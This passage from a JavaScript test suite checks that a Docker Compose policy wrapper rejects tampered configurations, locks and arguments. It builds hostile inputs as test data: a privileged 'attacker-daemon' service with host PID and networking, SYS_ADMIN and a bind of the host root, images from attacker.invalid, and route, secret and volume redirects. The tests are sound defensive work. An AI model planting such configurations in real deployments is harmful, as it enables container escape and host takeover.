      "ALERTMANAGER_IMAGE=trusted.invalid/alertmanager@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
      "WAF_HTTP_BIND=127.0.0.2:8088",
      "WAF_HTTPS_BIND=127.0.0.2:8448",
      "WAF_NGINX_ALWAYS_TLS_REDIRECT=off",
      "WAF_BLOCKING_PARANOIA=2",
      "WAF_DETECTION_PARANOIA=3",
      "WAF_ANOMALY_INBOUND=8",
      "WAF_ANOMALY_OUTBOUND=7",
      "PLATFORM_NETWORK_PREFIX=parity_core",
      "MARIADB_DATA_VOLUME=enterprise_parity_mariadb",
      "PROMETHEUS_RETENTION_TIME=30d",
      "CONTROL_CENTER_OIDC_ISSUER=https://issuer.parity.invalid/realms/platform",
      "CONTROL_CENTER_DATABASE_URL_SECRET_FILE=secrets/parity-control-url.txt",
      ...requiredCoreEnvironmentLines,
      "",
    ].join("\n");
    fs.writeFileSync(sandbox.environmentFile, environmentBytes, { mode: 0o600 });
    const config = coreAuthorityConfig();
    config.services.alertmanager.group_add = ["2222"];
    config.services.alertmanager.image =
      "trusted.invalid/alertmanager@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
    config.services.waf.ports = [
      { host_ip: "127.0.0.2", protocol: "tcp", published: "8088", target: 8080 },
      { host_ip: "127.0.0.2", protocol: "tcp", published: "8448", target: 8443 },
    ];
    Object.assign(config.services.waf.environment, {
      NGINX_ALWAYS_TLS_REDIRECT: "off",
      BLOCKING_PARANOIA: "2",
      DETECTION_PARANOIA: "3",
      ANOMALY_INBOUND: "8",
      ANOMALY_OUTBOUND: "7",
    });
    config.services["control-center"].environment.CONTROL_CENTER_OIDC_ISSUER =
      "https://issuer.parity.invalid/realms/platform";
    config.services.prometheus.command[2] = "--storage.tsdb.retention.time=30d";
    for (const networkName of expectedCoreInventory.networks) {
      if (networkName.startsWith("platform_") && networkName !== "platform_docker_control") {
        config.networks[networkName].name = `parity_core_${networkName.slice("platform_".length)}`;
      }
    }
    config.volumes.enterprise_mariadb_data.name = "enterprise_parity_mariadb";
    fs.writeFileSync(
      path.join(sandbox.root, "secrets/parity-control-url.txt"),
      "qa7-parity\n",
      { mode: 0o600 },
    );
    config.secrets.control_center_database_url.file =
      path.join(sandbox.root, "secrets/parity-control-url.txt");
    config.configs.enterprise_traefik_routes.content =
      config.configs.enterprise_traefik_routes.content.replaceAll("fixture.invalid", "parity.invalid");

    const expectedBytes = `${JSON.stringify(config, null, 2)}\n`;
    writeDockerOutput(sandbox, expectedBytes);
    const accepted = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(accepted.status, 0, accepted.stderr);
    assert.equal(renderer.count(), 1);
    assert.equal(accepted.stdout, expectedBytes);
    assert.doesNotMatch(accepted.stderr, /MODULE_NOT_FOUND/);

    renderer.reset();
    const mismatched = structuredClone(config);
    mismatched.services.alertmanager.image =
      `attacker.invalid/alertmanager@sha256:${"f".repeat(64)}`;
    writeDockerOutput(sandbox, `${JSON.stringify(mismatched)}\n`);
    const rejected = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(renderer.count(), 1);
    assert.notEqual(rejected.status, 0);
    assert.equal(rejected.stdout, "");
    assert.match(rejected.stderr, /semantic authority|runtime isolation/i);
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA7 no-hosted exact Engine authority rejects grants ports topology and redirects", () => {
  const sandbox = createConsumerSandbox();
  try {
    const renderer = installCountingRenderer(sandbox);
    writeDockerOutput(sandbox, `${JSON.stringify(coreAuthorityConfig())}\n`);
    const baseline = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(baseline.status, 0, baseline.stderr);
    assert.equal(renderer.count(), 1);
    assert.doesNotMatch(baseline.stderr, /MODULE_NOT_FOUND/);
    const mutations = [
      ["port", (config) => {
        config.services.alertmanager.ports = [{
          host_ip: "0.0.0.0", published: "9093", target: 9093, protocol: "tcp",
        }];
      }],
      ["network grant", (config) => {
        config.services.alertmanager.networks.platform_db_admin = null;
      }],
      ["secret grant", (config) => {
        config.services.alertmanager.secrets.push("postgres_superuser_password");
      }],
      ["config grant", (config) => {
        config.services.alertmanager.configs = [{
          source: "enterprise_traefik_routes",
          target: "/tmp/routes.yml",
        }];
      }],
      ["repository bind source", (config) => {
        config.services.alertmanager.volumes = [{
          type: "bind",
          source: path.join(sandbox.root, "README.md"),
          target: "/etc/alertmanager/alertmanager.yml",
          read_only: true,
        }];
      }],
      ["volume physical redirect", (config) => {
        config.volumes.enterprise_postgres_data.name = "attacker_volume";
      }],
      ["volume external reuse", (config) => {
        config.volumes.enterprise_postgres_data.external = true;
      }],
      ["network physical redirect", (config) => {
        config.networks.platform_cache.name = "attacker_network";
      }],
      ["network internal widening", (config) => {
        config.networks.platform_cache.internal = false;
      }],
      ["network attachable widening", (config) => {
        config.networks.platform_cache.attachable = true;
      }],
      ["config content redirect", (config) => {
        config.configs.enterprise_traefik_routes.content =
          config.configs.enterprise_traefik_routes.content.replace(
            "http://control-center:8080",
            "http://attacker:8080",
          );
      }],
      ["secret repository redirect", (config) => {
        config.secrets.smtp_password.file = path.join(
          sandbox.root,
          coreSemanticPolicyDescriptor.secretFiles.redis_password,
        );
      }],
    ];
    for (const [label, mutate] of mutations) {
      const config = coreAuthorityConfig();
      mutate(config);
      for (const kind of protectedKinds) {
        assert.deepEqual(Object.keys(config[kind]).sort(), expectedCoreInventory[kind]);
      }
      renderer.reset();
      writeDockerOutput(sandbox, `${JSON.stringify(config)}\n`);
      const result = runWrapper(sandbox, ["config", "--format", "json"]);
      assert.equal(renderer.count(), 1, `${label} caused a second render`);
      assert.notEqual(result.status, 0, `${label} was accepted`);
      assert.equal(result.stdout, "");
      assert.doesNotMatch(result.stderr, /MODULE_NOT_FOUND/);
      assert.match(result.stderr, /semantic authority|runtime isolation/i);
    }
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA7 no-hosted semantic descriptor mismatch fails closed before renderer", () => {
  const sandbox = createConsumerSandbox();
  try {
    const tamperedLock = JSON.parse(fs.readFileSync(sandbox.canonicalLock, "utf8"));
    tamperedLock.coreSemanticPolicy.sha256 = "f".repeat(64);
    fs.writeFileSync(sandbox.canonicalLock, `${JSON.stringify(tamperedLock, null, 2)}\n`, { mode: 0o600 });
    const configPath = path.join(sandbox.root, "core-config.json");
    fs.writeFileSync(configPath, `${JSON.stringify(coreAuthorityConfig())}\n`, { mode: 0o600 });
    const direct = spawnSync(process.execPath, [
      path.join(sandbox.scripts, "no-hosted-core-policy.mjs"),
      "--root",
      sandbox.root,
      "--lock",
      sandbox.canonicalLock,
      "--config",
      configPath,
      "--env",
      sandbox.environmentFile,
    ], { encoding: "utf8" });
    assert.notEqual(direct.status, 0, "helper accepted a mismatched policy descriptor");
    assert.equal(direct.stdout, "");
    assert.match(direct.stderr, /semantic authority rejected: policy-binding/i);
    assert.equal(fs.existsSync(sandbox.dockerMarker), false);

    writeDockerOutput(sandbox, `${JSON.stringify(coreAuthorityConfig())}\n`);
    const wrapper = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.notEqual(wrapper.status, 0, "wrapper accepted a mismatched policy descriptor");
    assert.equal(wrapper.stdout, "");
    assert.equal(fs.existsSync(sandbox.dockerMarker), false, "descriptor mismatch invoked renderer");
    assert.match(wrapper.stderr, /no-hosted lock raw digest mismatch|runtime lock is invalid/i);
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA6 canonical no-hosted lock contains the exact authoritative core inventory", () => {
  const lock = JSON.parse(fs.readFileSync(canonicalNoHostedLockPath, "utf8"));
  assert.deepEqual(Object.keys(lock).sort(), [
    "brokerPolicySha256",
    "coreSemanticPolicy",
    "projectName",
    "protectedResourceNames",
    "routes",
    "state",
    "validatorVersion",
    "version",
    "workloads",
  ]);
  assert.deepEqual(lock.coreSemanticPolicy, {
    schema: "platform-no-hosted-core-capability-policy/v2",
    sha256: "a2f334ea3eb59507ae6b9b6542bb1511743233aa4f2ef05b8e890a7d37399f9a",
  });
  assert.equal(lock.projectName, "platform_infra_vps");
  assert.deepEqual(Object.keys(lock.protectedResourceNames).sort(), protectedKinds);
  assert.deepEqual(lock.protectedResourceNames, expectedCoreInventory);
  assert.deepEqual(
    Object.fromEntries(protectedKinds.map((kind) => [kind, lock.protectedResourceNames[kind].length])),
    { configs: 1, networks: 9, secrets: 21, services: 20, volumes: 17 },
  );
  assert.equal(lock.protectedResourceNames.services.includes("php-apache"), false);
  for (const kind of protectedKinds) {
    const names = lock.protectedResourceNames[kind];
    assert.deepEqual(names, [...new Set(names)].sort(), `${kind} inventory is not sorted/unique`);
  }
});

test("QA6 no-hosted exact inventory baseline passes end-to-end", () => {
  const sandbox = addInfraConsumer(createConsumerSandbox());
  try {
    const config = coreRuntimeConfig(expectedCoreInventory);
    writeDockerOutput(sandbox, `${JSON.stringify(config)}\n`);
    const result = runInfraConsumer(sandbox);
    assert.equal(result.status, 0, result.stderr);
    const envelope = JSON.parse(
      runWrapper(sandbox).stdout,
    );
    assert.deepEqual(envelope.protectedResourceNames, expectedCoreInventory);
    assert.deepEqual(envelope.config, config);
    assert.equal(envelope.lockSha256, sha256(fs.readFileSync(sandbox.canonicalLock)));
  } finally {
    removeSandbox(sandbox);
  }
});

const candidateMissingNames = {
  configs: "enterprise_traefik_routes",
  networks: "platform_bus",
  secrets: "alertmanager_webhook_token",
  services: "alertmanager",
  volumes: "backup_scheduler_jobs",
};

for (const kind of protectedKinds) {
  test(`QA6 no-hosted rejects candidate missing one authoritative ${kind} entry`, () => {
    const sandbox = addInfraConsumer(createConsumerSandbox());
    try {
      const config = coreRuntimeConfig(expectedCoreInventory);
      delete config[kind][candidateMissingNames[kind]];
      writeDockerOutput(sandbox, `${JSON.stringify(config)}\n`);
      const result = runInfraConsumer(sandbox);
      assert.notEqual(result.status, 0, `candidate missing ${kind} was auto-authorized`);
      assert.match(result.stderr, /inventory|protected|resource|authority|mismatch/i);
    } finally {
      removeSandbox(sandbox);
    }
  });
}

for (const kind of protectedKinds) {
  test(`QA6 no-hosted rejects candidate extra ${kind} before it becomes core authority`, () => {
    const sandbox = addInfraConsumer(createConsumerSandbox());
    try {
      const config = coreRuntimeConfig(expectedCoreInventory);
      if (kind === "configs") config.configs.attacker_config = { file: "/attacker/config" };
      if (kind === "networks") config.networks.attacker_network = { internal: false };
      if (kind === "secrets") config.secrets.attacker_secret = { file: "/attacker/secret" };
      if (kind === "volumes") config.volumes.attacker_volume = { name: "attacker_volume" };
      if (kind === "services") {
        config.services["attacker-daemon"] = boundedService({
          privileged: true,
          pid: "host",
          network_mode: "host",
          cap_add: ["SYS_ADMIN"],
          devices: ["/dev/null:/dev/attacker"],
          volumes: [{ type: "bind", source: "/", target: "/host" }],
        });
      }
      writeDockerOutput(sandbox, `${JSON.stringify(config)}\n`);
      const result = runInfraConsumer(sandbox);
      assert.notEqual(result.status, 0, `candidate extra ${kind} was auto-authorized`);
      assert.match(result.stderr, /inventory|protected|resource|authority|mismatch/i);
    } finally {
      removeSandbox(sandbox);
    }
  });
}

function futureNoHostedLock() {
  return {
    ...JSON.parse(fs.readFileSync(canonicalNoHostedLockPath, "utf8")),
    projectName: "platform_infra_vps",
    protectedResourceNames: structuredClone(expectedCoreInventory),
  };
}

const lockInventoryMutations = [
  ...protectedKinds.map((kind) => [`missing-${kind}`, (lock) => {
    delete lock.protectedResourceNames[kind];
  }]),
  ...protectedKinds.map((kind) => [`minus-${kind}`, (lock) => {
    lock.protectedResourceNames[kind] = lock.protectedResourceNames[kind].slice(1);
  }]),
  ...protectedKinds.map((kind) => [`extra-${kind}`, (lock) => {
    lock.protectedResourceNames[kind] = [...lock.protectedResourceNames[kind], `attacker_${kind}`].sort();
  }]),
  ["duplicate", (lock) => {
    lock.protectedResourceNames.services = [
      lock.protectedResourceNames.services[0],
      ...lock.protectedResourceNames.services,
    ];
  }],
  ["unsorted", (lock) => {
    lock.protectedResourceNames.networks = [...lock.protectedResourceNames.networks].reverse();
  }],
  ["wrong-type", (lock) => {
    lock.protectedResourceNames.volumes = {};
  }],
  ["inventory-key-extra", (lock) => {
    lock.protectedResourceNames.images = [];
  }],
  ["top-level-key-extra", (lock) => {
    lock.attacker = true;
  }],
  ["project-name", (lock) => {
    lock.projectName = "attacker";
  }],
];

for (const [label, mutate] of lockInventoryMutations) {
  test(`QA6 no-hosted lock rejects ${label} before renderer`, () => {
    const sandbox = createConsumerSandbox();
    try {
      const lock = futureNoHostedLock();
      mutate(lock);
      fs.writeFileSync(sandbox.canonicalLock, `${JSON.stringify(lock, null, 2)}\n`, { mode: 0o600 });
      writeDockerOutput(sandbox, `${JSON.stringify(coreRuntimeConfig(expectedCoreInventory))}\n`);
      const result = runWrapper(sandbox);
      assert.notEqual(result.status, 0, `${label} lock inventory reached renderer`);
      assert.equal(fs.existsSync(sandbox.dockerMarker), false, `${label} lock inventory invoked Docker`);
    } finally {
      removeSandbox(sandbox);
    }
  });
}

test("QA6 no-hosted lock race preserves the initial authoritative snapshot or fails explicitly", () => {
  const sandbox = createConsumerSandbox();
  try {
    const originalLockBytes = fs.readFileSync(sandbox.canonicalLock);
    const initialLockSha256 = sha256(originalLockBytes);
    const config = coreRuntimeConfig(sandbox.inventory);
    writeDockerOutput(sandbox, `${JSON.stringify(config)}\n`);

    const baseline = runWrapper(sandbox);
    assert.equal(baseline.status, 0, baseline.stderr);
    const baselineEnvelope = JSON.parse(baseline.stdout);
    assert.equal(baselineEnvelope.lockSha256, initialLockSha256);
    assert.deepEqual(baselineEnvelope.protectedResourceNames, expectedCoreInventory);
    assert.deepEqual(baselineEnvelope.config, config);

    const foreignLock = path.join(sandbox.root, "foreign-no-hosted.lock.json");
    fs.writeFileSync(foreignLock, originalLockBytes, { mode: 0o600 });
    const foreign = runWrapper(sandbox, undefined, {
      HOSTED_WORKLOAD_RUNTIME_LOCK_SOURCE: foreignLock,
    });
    assert.notEqual(foreign.status, 0, "copied no-hosted lock bypassed canonical path binding");

    fs.writeFileSync(sandbox.canonicalLock, "{}\n", { mode: 0o600 });
    const preTampered = runWrapper(sandbox);
    assert.notEqual(preTampered.status, 0, "pre-tampered canonical lock reached Docker");
    fs.writeFileSync(sandbox.canonicalLock, originalLockBytes, { mode: 0o600 });

    const replacement = path.join(sandbox.root, "swap-lock-replacement");
    const replacementBytes = Buffer.from('{"attacker":true}\n');
    fs.writeFileSync(replacement, replacementBytes, { mode: 0o600 });
    const raced = runWrapper(sandbox);
    assert.equal(
      fs.existsSync(path.join(sandbox.root, "lock-swap-fired")),
      true,
      "lock race fake renderer did not execute the swap",
    );
    if (raced.status !== 0) {
      assert.match(
        raced.stderr,
        /(?:no-hosted|lock).*(?:changed|identity|snapshot|swap|digest|invalid|mismatch|tampered)|(?:changed|identity|snapshot|swap|digest|invalid|mismatch|tampered).*(?:no-hosted|lock)|repository-bind-authority/i,
        `lock race failed for an unrelated reason:\n${raced.stderr}`,
      );
    } else {
      const racedEnvelope = JSON.parse(raced.stdout);
      assert.equal(racedEnvelope.lockSha256, initialLockSha256);
      assert.notEqual(racedEnvelope.lockSha256, sha256(replacementBytes));
      assert.deepEqual(racedEnvelope.protectedResourceNames, expectedCoreInventory);
      assert.deepEqual(racedEnvelope.config, config);
    }
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA6 no-hosted env bytes are stable from mode parse through Compose render", () => {
  const sandbox = createConsumerSandbox();
  try {
    const initialEnvironment = [
      "HOSTED_WORKLOAD_LOCK=",
      "HOSTED_WORKLOAD_MODE=no-hosted",
      "CORE_VALUE=trusted",
      "DOMAIN=fixture.invalid",
      ...requiredCoreEnvironmentLines,
      "",
    ].join("\n");
    fs.writeFileSync(sandbox.environmentFile, initialEnvironment, { mode: 0o600 });
    const hostileEnvironment = path.join(sandbox.root, "swap-env-replacement");
    fs.writeFileSync(
      hostileEnvironment,
      [
        "HOSTED_WORKLOAD_LOCK=/attacker.lock",
        "HOSTED_WORKLOAD_MODE=hosted",
        "CORE_VALUE=hostile",
        "DOMAIN=attacker.invalid",
        ...requiredCoreEnvironmentLines,
        "",
      ].join("\n"),
      { mode: 0o600 },
    );
    writeDockerOutput(sandbox, `${JSON.stringify(coreRuntimeConfig(sandbox.inventory))}\n`);
    const baseline = runWrapper(sandbox);
    assert.equal(baseline.status, 0, baseline.stderr);
    assert.equal(fs.readFileSync(sandbox.dockerEnvironmentCapture, "utf8"), initialEnvironment);

    fs.rmSync(sandbox.dockerMarker, { force: true });
    fs.rmSync(sandbox.dockerEnvironmentCapture, { force: true });
    fs.writeFileSync(path.join(sandbox.root, "swap-env-trigger"), "swap\n", { mode: 0o600 });
    const raced = runWrapper(sandbox);
    assert.equal(
      fs.existsSync(path.join(sandbox.root, "env-swap-fired")),
      true,
      "env race fake renderer did not execute the swap",
    );
    const consumedBytes = fs.existsSync(sandbox.dockerEnvironmentCapture)
      ? fs.readFileSync(sandbox.dockerEnvironmentCapture, "utf8")
      : "";
    if (raced.status !== 0) {
      assert.match(
        raced.stderr,
        /(?:environment|env).*(?:changed|identity|snapshot|swap|digest|invalid|mismatch|tampered)|(?:changed|identity|snapshot|swap|digest|invalid|mismatch|tampered).*(?:environment|env)/i,
        `env race failed for an unrelated reason:\n${raced.stderr}`,
      );
    } else {
      assert.equal(consumedBytes, initialEnvironment, `Compose consumed swapped env bytes:\n${consumedBytes}`);
    }
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA7 Compose renderer receives only the minimal authoritative process environment", () => {
  const sandbox = createConsumerSandbox();
  try {
    const config = coreAuthorityConfig();
    writeDockerOutput(sandbox, `${JSON.stringify(config)}\n`);
    const rendered = runWrapper(
      sandbox,
      ["config", "--format", "json"],
      {
        KC_HOSTNAME_STRICT: "false",
        POSTGRES_IMAGE: `attacker.invalid/postgres@sha256:${"f".repeat(64)}`,
      },
    );
    assert.equal(rendered.status, 0, rendered.stderr);
    assert.deepEqual(JSON.parse(rendered.stdout), config);
    const rendererEnvironment =
      fs.readFileSync(sandbox.dockerProcessEnvironmentCapture, "utf8");
    assert.doesNotMatch(rendererEnvironment, /^KC_HOSTNAME_STRICT=/m);
    assert.doesNotMatch(rendererEnvironment, /^POSTGRES_IMAGE=/m);
    assert.match(rendererEnvironment, /^DOCKER_HOST=unix:\/\/\/var\/run\/docker\.sock$/m);
    assert.match(
      rendererEnvironment,
      new RegExp(
        `^HOSTED_WORKLOAD_RUNTIME_LOCK_SOURCE=${sandbox.canonicalLock.replaceAll(/[.*+?^${}()|[\]\\]/g, "\\$&")}$`,
        "m",
      ),
    );
    assert.match(
      rendererEnvironment,
      new RegExp(`^PATH=${sandbox.environment.PATH.replaceAll(/[.*+?^${}()|[\]\\]/g, "\\$&")}$`, "m"),
    );
    if (process.env.HOME) {
      assert.match(
        rendererEnvironment,
        new RegExp(`^HOME=${process.env.HOME.replaceAll(/[.*+?^${}()|[\]\\]/g, "\\$&")}$`, "m"),
      );
    }
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA6 PREPARE_RESOLVED accepts only exact hosted mode and forbids envelope", () => {
  const sandbox = createConsumerSandbox();
  try {
    writeDockerOutput(sandbox, `${JSON.stringify(coreRuntimeConfig(sandbox.inventory))}\n`);
    const prepareEnvironment = {
      HOSTED_WORKLOAD_LOCK: "",
      HOSTED_WORKLOAD_MODE: "hosted",
      HOSTED_WORKLOAD_PREPARE_RESOLVED: "1",
      HOSTED_WORKLOAD_RUNTIME_LOCK_SOURCE: sandbox.workloadLock,
    };
    const positive = runWrapper(sandbox, ["config", "--format", "json"], prepareEnvironment);
    assert.equal(positive.status, 0, positive.stderr);
    fs.rmSync(sandbox.dockerMarker, { force: true });

    const unboundStateRoot = path.join(sandbox.cleanupRoot, "unbound-release-state");
    const unboundEnvironment = path.join(unboundStateRoot, "environment.env");
    fs.mkdirSync(unboundStateRoot, { mode: 0o700 });
    fs.writeFileSync(unboundEnvironment, fs.readFileSync(sandbox.environmentFile), { mode: 0o640 });
    fs.chmodSync(unboundEnvironment, 0o640);
    for (const prepare of ["0", "1"]) {
      const unbound = runWrapper(sandbox, ["config", "--format", "json"], {
        ...prepareEnvironment,
        COMPOSE_ENV_FILE: unboundEnvironment,
        HOSTED_WORKLOAD_PREPARE_RESOLVED: prepare,
      });
      assert.notEqual(unbound.status, 0, `unbound mode-0640 environment passed PREPARE=${prepare}`);
      assert.match(unbound.stderr, /trusted release context|target release-state|target Linux host|activation environment/i);
      assert.equal(fs.existsSync(sandbox.dockerMarker), false, "unbound mode-0640 environment reached Docker");
    }

    const envelope = runWrapper(sandbox, ["runtime-isolation-envelope"], prepareEnvironment);
    assert.notEqual(envelope.status, 0, "PREPARE_RESOLVED emitted a semantic envelope");
    assert.equal(fs.existsSync(sandbox.dockerMarker), false, "forbidden PREPARE envelope reached Docker");

    const acceptedModes = [];
    for (const mode of ["", "no-hosted", "evil", "HOSTED", " hosted", "hosted ", "No-hosted", "NO-HOSTED"]) {
      fs.rmSync(sandbox.dockerMarker, { force: true });
      const result = runWrapper(sandbox, ["config", "--format", "json"], {
        ...prepareEnvironment,
        HOSTED_WORKLOAD_MODE: mode,
      });
      if (result.status === 0 || fs.existsSync(sandbox.dockerMarker)) acceptedModes.push(mode);
    }
    assert.deepEqual(acceptedModes, [], `PREPARE accepted non-exact modes: ${JSON.stringify(acceptedModes)}`);
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA6 infra runtime-isolation CLI closes argv before invoking the renderer", () => {
  const sandbox = addInfraConsumer(createConsumerSandbox());
  try {
    writeDockerOutput(sandbox, `${JSON.stringify(coreRuntimeConfig(sandbox.inventory))}\n`);
    for (const allowedArguments of [
      ["--env-file", sandbox.environmentFile],
      ["--envFile", sandbox.environmentFile],
      [`--env-file=${sandbox.environmentFile}`],
      [`--envFile=${sandbox.environmentFile}`],
    ]) {
      fs.rmSync(sandbox.dockerMarker, { force: true });
      const allowed = runInfraArguments(sandbox, allowedArguments);
      assert.equal(allowed.status, 0, allowed.stderr);
    }

    const accepted = [];
    for (const [label, arguments_] of [
      ["unknown split", ["--env-file", sandbox.environmentFile, "--foo", "attacker"]],
      ["unknown equals", ["--env-file", sandbox.environmentFile, "--foo=attacker"]],
      ["unknown flag", ["--env-file", sandbox.environmentFile, "--foo"]],
      ["positional", ["--env-file", sandbox.environmentFile, "attacker-positional"]],
      ["duplicate env-file", [
        "--env-file", sandbox.environmentFile,
        "--env-file", sandbox.environmentFile,
      ]],
      ["both aliases", [
        "--env-file", sandbox.environmentFile,
        "--envFile", sandbox.environmentFile,
      ]],
      ["empty env-file", ["--env-file="]],
      ["empty envFile", ["--envFile="]],
    ]) {
      fs.rmSync(sandbox.dockerMarker, { force: true });
      const result = runInfraArguments(sandbox, arguments_);
      const rendererInvoked = fs.existsSync(sandbox.dockerMarker);
      if (result.status === 0 || rendererInvoked) {
        accepted.push(label);
      } else {
        assert.match(
          result.stderr,
          /argument|argv|option|unknown|invalid|forbidden|duplicate|empty/i,
          `${label} failed before renderer for an unrelated reason:\n${result.stderr}`,
        );
      }
    }
    assert.deepEqual(accepted, [], `runtime-isolation-check accepted unknown argv: ${accepted.join(", ")}`);
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA8 exact overlay golden preserves the four independently derived canonical states", () => {
  const sandbox = createConsumerSandbox();
  try {
    const environment = installQa8Environment(sandbox);
    const config = qa8IndependentGolden(sandbox);
    materializeQa8CanonicalSources(sandbox, config);
    const lock = JSON.parse(fs.readFileSync(sandbox.canonicalLock, "utf8"));
    const violations = validateNoHostedCoreAuthority(
      lock,
      config,
      sandbox.root,
      environment,
    );
    assert.deepEqual(
      violations,
      [],
      `canonical nine-overlay states were rejected: ${violations.join(",")}`,
    );
  } finally {
    removeSandbox(sandbox);
  }
});

function localPrivateQa8Fixture(sandbox) {
  const environment = installQa8Environment(sandbox);
  const config = qa8IndependentGolden(sandbox);
  materializeQa8CanonicalSources(sandbox, config);
  const dataRoot = path.join(sandbox.cleanupRoot, "local-private-data");
  const sourceDirectory = path.join(path.dirname(dataRoot), "src");
  const previousSourceDirectory = path.join(sandbox.cleanupRoot, "compose-source");
  const stateDirectory = path.join(dataRoot, "project-state");
  const certificatesDirectory = path.join(dataRoot, "certificates");
  const secretsRoot = path.join(dataRoot, "secrets");
  for (const directory of [dataRoot, stateDirectory, certificatesDirectory, secretsRoot]) {
    fs.mkdirSync(directory, { recursive: true, mode: 0o700 });
    fs.chmodSync(directory, 0o700);
  }
  const certificate = path.join(certificatesDirectory, "local-cert.pem");
  const privateKey = path.join(certificatesDirectory, "local-key.pem");
  const localCa = path.join(certificatesDirectory, "local-ca.pem");
  const bootstrapToken = path.join(secretsRoot, "first-configuration-bootstrap-token.txt");
  const keycloakClientSecret = path.join(secretsRoot, "first-configuration-keycloak-secret.txt");
  for (const [filename, mode] of [
    [certificate, 0o644],
    [privateKey, 0o600],
    [localCa, 0o644],
    [bootstrapToken, 0o600],
    [keycloakClientSecret, 0o600],
  ]) {
    fs.writeFileSync(filename, `local-private-${path.basename(filename)}\n`, { mode });
    fs.chmodSync(filename, mode);
  }
  for (const [secretName, authority] of Object.entries(
    LOCAL_PRIVATE_BASE_SECRET_AUTHORITY,
  )) {
    const releaseFile = config.secrets[secretName].file;
    const externalFile = path.join(secretsRoot, authority.filename);
    const fileMode = Number.parseInt(authority.mode, 8);
    fs.writeFileSync(externalFile, `local-private-${secretName}\n`, { mode: fileMode });
    fs.chmodSync(externalFile, fileMode);
    config.secrets[secretName].file = externalFile;
    fs.rmSync(releaseFile, { force: true });
  }
  const localLock = sandbox.localPrivateCanonicalLock;
  Object.assign(environment, {});
  for (const [key, value] of Object.entries({
    PHP_PROJECTS_DIR: sourceDirectory,
    PLATFORM_COMPOSE_VARIANT: "LOCAL_PRIVATE",
    PLATFORM_DATA_ROOT: dataRoot,
    PLATFORM_STATE_DIR: stateDirectory,
    PLATFORM_CERTS_DIR: certificatesDirectory,
    PLATFORM_SECRETS_ROOT: secretsRoot,
    CONTROL_CENTER_LOCAL_CA_CERT_SOURCE: localCa,
    CONTROL_CENTER_FIRST_CONFIGURATION_BOOTSTRAP_TOKEN_SECRET_FILE: bootstrapToken,
    CONTROL_CENTER_FIRST_CONFIGURATION_KEYCLOAK_CLIENT_SECRET_FILE: keycloakClientSecret,
    HOSTED_WORKLOAD_RUNTIME_LOCK_SOURCE: localLock,
    PROJECT_SOURCE_DIR: sourceDirectory,
  })) environment.set(key, value);
  let replacedSourceMounts = 0;
  for (const service of Object.values(config.services)) {
    for (const mount of service.volumes ?? []) {
      if (mount?.type === "bind" && mount.source === previousSourceDirectory) {
        mount.source = sourceDirectory;
        replacedSourceMounts += 1;
      }
    }
  }
  assert.equal(replacedSourceMounts, 2, "LOCAL_PRIVATE source projection fixture drifted");
  for (const [secretName, variable] of Object.entries(
    coreSemanticPolicyDescriptor.secretFileVariables,
  )) {
    environment.set(variable, path.join(sandbox.cleanupRoot, `ignored-${secretName}.txt`));
  }

  const additionalSecrets = {
    control_center_first_configuration_bootstrap_token: bootstrapToken,
    control_center_first_configuration_keycloak_client_secret: keycloakClientSecret,
  };
  for (const [secretName, filename] of Object.entries(additionalSecrets)) {
    config.secrets[secretName] = {
      file: filename,
      name: `platform_infra_vps_${secretName}`,
    };
    config.services["control-center"].secrets.push({
      source: secretName,
      target: `/run/secrets/${secretName}`,
    });
  }

  Object.assign(config.services["control-center"].environment, {
    CONTROL_CENTER_ENV: "local_private",
    CONTROL_CENTER_FIRST_CONFIGURATION_MODE: "required",
    CONTROL_CENTER_FIRST_CONFIGURATION_BOOTSTRAP_TOKEN_FILE:
      "/run/secrets/control_center_first_configuration_bootstrap_token",
    CONTROL_CENTER_FIRST_CONFIGURATION_KEYCLOAK_CLIENT_ID: "platform-first-configuration",
    CONTROL_CENTER_FIRST_CONFIGURATION_KEYCLOAK_CLIENT_SECRET_FILE:
      "/run/secrets/control_center_first_configuration_keycloak_client_secret",
    CONTROL_CENTER_FIRST_CONFIGURATION_ADMIN_USERNAME: "admin",
    CONTROL_CENTER_FIRST_CONFIGURATION_ADMIN_EMAIL: "admin@example.com",
    CONTROL_CENTER_FIRST_CONFIGURATION_ALLOWED_CIDRS:
      "10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,127.0.0.0/8,::1/128",
    CONTROL_CENTER_FIRST_CONFIGURATION_TRUSTED_PROXY_CIDRS:
      "172.16.0.0/12,127.0.0.0/8,::1/128",
    CONTROL_CENTER_FIRST_CONFIGURATION_ACCOUNT_URL:
      "https://auth.fixture.invalid/realms/platform/account/",
    CONTROL_CENTER_FIRST_CONFIGURATION_TOKEN_ENDPOINT:
      "https://auth.fixture.invalid/realms/platform/protocol/openid-connect/token",
    CONTROL_CENTER_FIRST_CONFIGURATION_ADMIN_BASE_URL:
      "https://auth.fixture.invalid/admin/realms/platform",
    CONTROL_CENTER_MIN_PASSKEYS: "2",
    NODE_EXTRA_CA_CERTS: "/run/platform/tls/control-center-local-ca.pem",
  });
  config.services["control-center"].extra_hosts = ["auth.fixture.invalid=host-gateway"];

  const replaceMount = (serviceName, target, source) => {
    const mount = config.services[serviceName].volumes.find((entry) => entry.target === target);
    assert.ok(mount, `missing ${serviceName} ${target} mount`);
    mount.source = source;
  };
  replaceMount("waf", "/etc/nginx/conf/server.crt", certificate);
  replaceMount("waf", "/etc/nginx/conf/server.key", privateKey);
  replaceMount("control-center", "/var/www/project-state", stateDirectory);
  config.services["control-center"].volumes.push({
    type: "bind",
    source: localCa,
    target: "/run/platform/tls/control-center-local-ca.pem",
    read_only: true,
    bind: {},
  });
